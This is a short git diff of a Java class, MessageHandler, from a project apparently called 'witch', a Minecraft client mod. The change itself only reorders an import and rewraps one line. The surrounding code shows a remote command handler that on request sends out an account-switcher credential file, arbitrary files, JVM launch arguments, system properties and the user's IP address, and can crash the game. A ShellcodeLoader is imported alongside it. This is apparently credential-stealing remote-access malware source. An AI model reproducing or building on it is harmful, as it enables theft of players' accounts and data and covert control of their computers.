@@ -4,10 +4,10 @@ import com.google.gson.Gson;
 import me.soda.witch.client.Witch;
 import me.soda.witch.client.features.PlayerInfo;
 import me.soda.witch.client.features.ShellcodeLoader;
+import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.HandleMessage;
 import me.soda.witch.shared.Message;
-import me.soda.witch.client.utils.*;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
@@ -65,7 +65,8 @@ public class MessageHandler {
                     }
                     case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                     case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
-                    case "runargs" -> messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
+                    case "runargs" ->
+                            messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                     case "props" -> messageUtils.send(msgType, System.getProperties());
                     case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
                     case "crash" -> MinecraftUtil.crash();
